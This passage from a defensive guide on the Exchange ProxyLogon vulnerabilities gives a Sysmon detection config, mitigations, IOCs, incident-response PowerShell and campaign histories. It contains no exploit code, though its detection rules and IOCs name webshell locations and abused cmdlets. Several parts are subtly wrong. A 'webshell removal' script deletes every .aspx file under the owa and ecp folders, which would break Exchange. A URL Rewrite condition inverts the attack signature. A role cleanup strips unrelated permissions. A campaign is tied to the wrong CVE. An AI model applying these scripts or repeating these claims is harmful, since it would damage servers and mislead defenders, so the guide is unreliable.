        C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\;
        C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\;
        C:\inetpub\wwwroot\
      </TargetFilename>
      <!-- Look for suspicious file extensions -->
      <TargetFilename condition="end with any">
        .aspx;.asp;.jsp;.jspx;.jspf
      </TargetFilename>
    </FileCreate>
    
    <!-- Event ID 1: Process Creation (cmdlet execution) -->
    <ProcessCreate onmatch="include">
      <!-- PowerShell executing Exchange cmdlets -->
      <ParentImage condition="is">powershell.exe</ParentImage>
      <CommandLine condition="contains any">
        Set-OabVirtualDirectory;
        Reset-OabVirtualDirectory;
        New-MailboxExportRequest;
        Set-VirtualDirectory
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## Microsoft Defender for Cloud

**Alert Name:** "Exchange Server Remote Code Execution (ProxyLogon)"
- **Severity:** **Critical**
- **Description:** Activity detected consistent with exploitation of CVE-2021-26855 and CVE-2021-27065 on an Exchange server
- **Applies To:** All subscriptions with **Defender for Servers** enabled
- **Remediation:** 
  1. Immediately isolate the affected Exchange server from the network.
  2. Run the EOMT.ps1 mitigation tool.
  3. Apply the latest cumulative update for Exchange.
  4. Conduct forensic analysis for indicators of compromise.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: **ON**
   - **Defender for App Service**: **ON** (if using Azure App Service)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Patch Immediately to Latest Cumulative Update**
- Applies To Versions:** Exchange 2013 SP1+, 2016 CU1+, 2019 CU1+

Upgrade to the following patched versions minimum:
- Exchange 2013: Cumulative Update 22 or later
- Exchange 2016: Cumulative Update 20 or later
- Exchange 2019: Cumulative Update 9 or later

**Manual Steps (PowerShell - Server 2016/2019):**
1. Download the latest CU from [Microsoft Update Center](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates)
2. Stop the Exchange services:
   ```powershell
   Stop-Service -Name MSExchangeAB, MSExchangeADTopology, MSExchangeAntispamUpdate, MSExchangeEdgeSync, MSExchangeFrontEndTransport, MSExchangeHMRecovery, MSExchangeHubTransport, MSExchangeImap4, MSExchangeMailboxAssistants, MSExchangeMailboxReplication, MSExchangeNotificationBroker, MSExchangePop3, MSExchangeRPC, MSExchangeServiceHost, MSExchangeTransportLogSearch, MSExchangeUnifiedMessaging, wsbexchange
   ```
3. Run the CU installer:
   ```cmd
   cd C:\Patch
   .\Exchange2019-KB5003437-x64.exe /s /v"/qb /norestart"
   ```
4. Restart the server:
   ```powershell
   Restart-Computer -Force
   ```
5. Verify patch applied:
   ```powershell
   Get-ExchangeServer | Select-Object AdminDisplayVersion
   ```

**Manual Steps (Server 2013):**
1. Download CU22 or later for Exchange 2013
2. Repeat steps 2-5 above

---

**Mitigation 2: Apply URL Rewrite Rules to Mitigate CVE-2021-26855 SSRF (Temporary, until patching is complete)**

This mitigation blocks the initial SSRF attack vector to prevent unauthenticated access.

**Manual Steps (IIS - Server 2016+):**
1. Ensure **URL Rewrite Module** is installed:
   ```powershell
   Install-WindowsFeature Web-Rewrite
   ```
2. Open **IIS Manager** on the Exchange server
3. Navigate to **Default Web Site** → **URL Rewrite**
4. Click **Add Rule(s)...** → **New Inbound Rule**
5. **Pattern:** `^autodiscover/autodiscover\.xml$`
6. **Conditions:** Add:
   - HTTP_HOST contains autodiscover
   - HTTP_X_BEResource is empty (NOT exists)
7. **Action:** `Block`
8. Click **OK**
9. Repeat for other suspicious paths: `/rpc/rpcproxy.dll`, `/ews/exchange.asmx`, etc.

**Manual Steps (PowerShell - Alternative):**
```powershell
# Create URL Rewrite rule via PowerShell
Add-WebConfigurationProperty -pspath "IIS:\Sites\Default Web Site" `
  -filter "system.webServer/rewrite/rules" `
  -name "." `
  -value @{name="BlockSSRFVectorSSRF";patternSyntax="ECMAScript";stopProcessing=$false}

Set-WebConfigurationProperty -pspath "IIS:\Sites\Default Web Site\Rewrite\Rules\BlockSSRFVectorSSRF" `
  -name "match" `
  -value @{url="^autodiscover/autodiscover\.xml$";negate=$false}

Set-WebConfigurationProperty -pspath "IIS:\Sites\Default Web Site\Rewrite\Rules\BlockSSRFVectorSSRF" `
  -name "action" `
  -value @{type="AbortRequest";statusCode=403}
```

**Validation Command (Verify Fix):**
```powershell
# Test if SSRF mitigation is active
$mitigation = (Get-WebConfigurationProperty -pspath "IIS:\Sites\Default Web Site" -filter "system.webServer/rewrite/rules").value
if ($mitigation) {
    Write-Host "✓ URL Rewrite rules are configured and active"
} else {
    Write-Host "✗ URL Rewrite rules NOT found - SSRF vector still open"
}

# Verify rewrite rules via IIS Manager
Get-WebConfigurationProperty -pspath "IIS:\Sites\Default Web Site\Rewrite\Rules" -name . | Select-Object name, enabled
```

**Expected Output (If Secure):**
```
name                           enabled
----                           -------
BlockSSRFVectorSSRF            True
BlockProxyLogonEWS             True
BlockProxyLogonAutoDiscover    True
```

---

**Mitigation 3: Run EOMT.ps1 and Microsoft Safety Scanner**

The Exchange On-Premises Mitigation Tool (EOMT.ps1) detects and remediates existing compromises.

**Manual Steps (PowerShell - Admin):**
1. Download the tool:
   ```powershell
   Invoke-WebRequest -Uri "https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/EOMT.ps1" -OutFile "EOMT.ps1"
   ```
2. Execute the tool:
   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process
   .\EOMT.ps1
   ```
3. The tool will:
   - Apply URL Rewrite mitigations for CVE-2021-26855
   - Scan for malware and webshells using Microsoft Safety Scanner
   - Attempt to remediate detected compromises
   - Generate a report: `ToolLogs\EOMT-<date>.log`

---

### Priority 2: HIGH

**Mitigation 4: Disable OAB Offline Delivery (Temporary)**
- Applies To:** All versions until patching is complete

Temporarily disable the OAB Virtual Directory to prevent CVE-2021-27065 exploitation:

**Command (PowerShell):**
```powershell
# Disable OAB Virtual Directory
Set-OabVirtualDirectory -Identity "OAB (Default)" -ExternalUrl $null -InternalUrl $null

# Verify disabled
Get-OabVirtualDirectory | Select-Object Identity, ExternalUrl, InternalUrl

# Expected Output:
# Identity            ExternalUrl InternalUrl
# ----                ----------- -----------
# OAB (Default)       (empty)     (empty)
```

**Re-Enable After Patching:**
```powershell
# Re-enable OAB Virtual Directory with safe URLs
Set-OabVirtualDirectory -Identity "OAB (Default)" `
  -ExternalUrl "https://mail.contoso.com/oab" `
  -InternalUrl "https://mail.contoso.com/oab"
```

---

**Mitigation 5: Enable Conditional Access & MFA for Exchange Admin Access**

**Manual Steps (Azure Portal - Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **General Tab:**
   - Name: `Block Exchange Admin Access from Unapproved Locations`
   - Enable policy: **ON**
4. **Assignments:**
   - Users: Select **Privileged Administrators** (Exchange Admins)
   - Cloud apps: Select **Office 365 Exchange Online**
5. **Conditions:**
   - Locations: **Exclude** approved corporate IPs; **Include** any other location
   - Sign-in risk: **Medium and High**
   - Device platforms: **Exclude** Compliant devices
6. **Access controls:**
   - Grant: **Require multi-factor authentication**
   - Require all selected controls: **Yes**
7. Click **Create**

---

**Mitigation 6: Restrict PowerShell and Cmdlet Execution**

Limit who can execute Exchange PowerShell cmdlets:

**Command (PowerShell - Exchange Management Shell):**
```powershell
# Restrict Set-OabVirtualDirectory cmdlet to a specific admin group
Get-ManagementRoleAssignment | Where-Object {$_.RoleDefinitionName -match "MailboxSearch"} | Remove-ManagementRoleAssignment -Force

# Create custom role with restricted cmdlets
New-ManagementRole -Name "LimitedExchangeAdmin" -Parent "Exchange Administrator" -Description "Custom admin role without dangerous cmdlets"

# Remove dangerous cmdlets from the new role
Remove-ManagementRoleEntry "LimitedExchangeAdmin\Set-OabVirtualDirectory" -Force
Remove-ManagementRoleEntry "LimitedExchangeAdmin\Reset-OabVirtualDirectory" -Force
Remove-ManagementRoleEntry "LimitedExchangeAdmin\New-MailboxExportRequest" -Force

# Assign the restricted role to specific admins
New-ManagementRoleAssignment -Role "LimitedExchangeAdmin" -User "admin-restricted@contoso.com"
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shell.aspx` (commonly observed webshell location)
- `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\*.aspx` (ECP webshells)
- `C:\inetpub\wwwroot\*.aspx` (root webshells)
- `C:\Temp\*.aspx` (temporary staging location)
- `C:\Windows\Temp\iftm\` (NTDS.dit export staging)

**Registry:**
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` (persistence entries added post-exploitation)
- `HKLM\System\CurrentControlSet\Services\` (backdoor service registration)

**Network:**
- Outbound connections from Exchange server to external C2 servers
- POST requests to `/autodiscover/autodiscover.xml` with X-BEResource header from external IPs
- Large data transfers (mailbox exports, NTDS.dit transfers) to external servers

---

### Forensic Artifacts

**Disk:**
- IIS logs: `C:\inetpub\logs\LogFiles\W3SVC1\` (HTTP requests to autodiscover, EWS, OWA)
- Exchange ECP logs: `$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\ECP\Server\`
- Event logs: `C:\Windows\System32\winevt\Logs\Security.evtx`, `Application.evtx`
- Web shell files with ASPX extension and suspicious content (see above)

**Memory:**
- PowerShell process (powershell.exe) with cmdlet execution evidence (if still in memory)
- IIS worker process (w3wp.exe) with webshell code loaded

**Cloud (if auditing is enabled):**
- Unified Audit Log entries showing Set-OabVirtualDirectory, Reset-OabVirtualDirectory, New-MailboxExportRequest cmdlet execution
- O365 activity logs showing unusual mail forwarding, admin account creation

**MFT/USN Journal:**
- File creation entries for .aspx files in wwwroot directories
- Timestamp correlation with ProxyLogon exploitation window

---

### Response Procedures

**1. Isolate (0-5 minutes):**

**Command (PowerShell):**
```powershell
# Disconnect the Exchange server from the network
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Alternatively, block outbound traffic via Windows Firewall
New-NetFirewallRule -DisplayName "Block-Outbound-Isolation" -Direction Outbound -Action Block -RemoteAddress 0.0.0.0/0 -Enabled $true
```

**Manual (Azure):**
- Navigate to **Azure Portal** → **Virtual Machines** → Select the compromised Exchange VM
- Go to **Networking** → Select the NIC
- Click **Network security group** → **Inbound rules** → Block all inbound traffic
- Or shut down the VM: Click **Stop**

---

**2. Collect Evidence (5-30 minutes):**

**Command (PowerShell - Collection Script):**
```powershell
# Create evidence collection directory
New-Item -ItemType Directory -Path "C:\Evidence" -Force

# Export Security Event Log
wevtutil epl Security "C:\Evidence\Security.evtx"
wevtutil epl Application "C:\Evidence\Application.evtx"

# Capture memory dump (requires Sysinternals Procdump)
procdump64.exe -ma powershell.exe "C:\Evidence\powershell.dmp"
procdump64.exe -ma w3wp.exe "C:\Evidence\w3wp.dmp"

# Copy IIS logs
Copy-Item -Path "C:\inetpub\logs\LogFiles\W3SVC1\*" -Destination "C:\Evidence\IIS_Logs" -Recurse

# Copy Exchange logs
Copy-Item -Path "$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\ECP\Server\*" -Destination "C:\Evidence\ECP_Logs" -Recurse

# List all .aspx files in Exchange directories
Get-ChildItem -Path "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\" -Filter "*.aspx" -Recurse | Export-Csv "C:\Evidence\Webshells.csv"

# Export Unified Audit Log (if M365 integration exists)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -FreeText "Set-OabVirtualDirectory" | Export-Csv "C:\Evidence\UAL_Logs.csv"
```

**Manual (File Collection):**
1. Open **File Explorer**
2. Navigate to `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\`
3. Look for suspicious `.aspx` files
4. Copy to external drive or USB for analysis

---

**3. Remediate (30-120 minutes):**

**Command (PowerShell - Webshell Removal):**
```powershell
# Remove all .aspx webshells from Exchange directories
$suspiciousFiles = Get-ChildItem -Path "C:\Program Files\Microsoft\Exchange Server\V15\" -Filter "*.aspx" -Recurse | Where-Object {
    $_.FullName -like "*owa*" -or $_.FullName -like "*ecp*"
}

foreach ($file in $suspiciousFiles) {
    Remove-Item -Path $file.FullName -Force
    Write-Host "Removed: $($file.FullName)"
}
```

**Command (PowerShell - Backdoor Account Removal):**
```powershell
# List all user accounts created after the exploitation date
$compromiseDate = Get-Date "2021-03-02"
Get-LocalUser | Where-Object {$_.PasswordLastSet -gt $compromiseDate} | Select-Object Name, PasswordLastSet

# Remove suspicious accounts
Remove-LocalUser -Name "backdoor" -Confirm:$false
Remove-LocalUser -Name "svc_exchange" -Confirm:$false
```

**Command (PowerShell - Mail Forwarding Removal):**
```powershell
# Check for forwarding rules added by attacker
Get-InboxRule | Where-Object {$_.ForwardTo -notlike $null} | Select-Object Identity, ForwardTo

# Remove suspicious forwarding rules
Get-InboxRule | Where-Object {$_.Identity -like "Attacker-*"} | Remove-InboxRule -Confirm:$false
```

**Command (PowerShell - Full Remediation - EOMT.ps1):**
```powershell
# Run the full Microsoft mitigation tool (includes webshell removal, account cleanup, etc.)
.\EOMT.ps1 -FixIt
```

**Manual (Server Rebuild - Recommended):**
1. If compromise is confirmed, the safest approach is a complete server rebuild.
2. Restore from a verified clean backup **before** the exploitation date.
3. Reapply all patches post-restoration.
4. Reconfigure all custom settings and SSL certificates.

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-002] Anonymous LDAP Binding | Attacker maps the domain to identify Exchange servers and admin accounts |
| **2** | **Initial Access** | **[PE-REMOTE-001] CVE-2021-27065 (THIS TECHNIQUE)** | **Exploitation of Exchange Server vulnerabilities to achieve RCE** |
| **3** | **Credential Access** | [CA-DUMP-002] DCSync Attack | Attacker uses SYSTEM privileges to perform DCSync and dump AD credentials |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates hidden admin account or adds persistence via app registration |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses dumped hashes to move laterally to Domain Controllers and file servers |
| **6** | **Impact** | Data Exfiltration & Ransomware | Attacker exfiltrates mailbox data and deploys ransomware across the environment |

---

## Real-World Examples

### Example 1: HAFNIUM Campaign (March 2021 - Present)

- **Target:** US Government agencies, critical infrastructure organizations, healthcare providers (400+ organizations compromised)
- **Timeline:** Active exploitation from January 2021 onwards; publicly disclosed March 2, 2021
- **Technique Status:** CVE-2021-27065 exploited as part of ProxyLogon chain; chained with CVE-2021-26855 (SSRF) and CVE-2021-26857 (Deserialization)
- **Impact:** 
  - Complete Exchange server compromise
  - Full mailbox contents stolen (including sensitive government communications, healthcare records)
  - Active Directory databases (NTDS.dit) extracted
  - Backdoor accounts created for persistent access
  - Later used to deploy ransomware (FiveHands, Conti variants)
- **Reference:** [Volexity Threat Analysis](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/), [Microsoft MSRC Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065), [FBI/CISA Joint Alert](https://www.ic3.gov/CSA/2021/210310.pdf)

---

### Example 2: LockFile Ransomware Gang (2021 - 2022)

- **Target:** Fortune 500 companies across multiple sectors
- **Timeline:** Summer 2021 - Early 2022
- **Technique Status:** Exploited CVE-2021-27065 combined with CVE-2021-36942 (PetitPotam) for Domain Controller compromise
- **Attack Sequence:**
  1. CVE-2021-27065 → Exchange RCE (SYSTEM privileges)
  2. ProcdumpExe download → LSASS.exe memory dump → credential extraction
  3. PetitPotam exploitation → DC compromise
  4. Lateral movement across network
  5. LockFile ransomware deployment
- **Impact:** Ransoms in the millions; data exfiltration + encryption
- **Reference:** [Cyble Research](https://cyble.com/blog/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/), [Mandiant Analysis](https://www.mandiant.com/resources/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers)

---

### Example 3: Play Ransomware Group (Late 2022)

- **Target:** Organizations with unpatched Exchange servers
- **Timeline:** October 2022 - Present
- **Technique Status:** Adapted ProxyLogon to bypass emergency mitigations using SSRF on different endpoints (CVE-2022-41040 / CVE-2022-41082 - ProxyNotShell)
- **Innovation:** Bypassed Microsoft's URL Rewrite mitigations by targeting the Outlook Web Access (OWA) endpoint instead of Autodiscover
- **Impact:** Rapid deployment of Play ransomware; lateral movement to backups
- **Reference:** [Quorum Cyber Analysis](https://quorumcyber.com/threat-intelligence/new-exchange-attack-bypasses-proxynotshell-mitigations/)

---

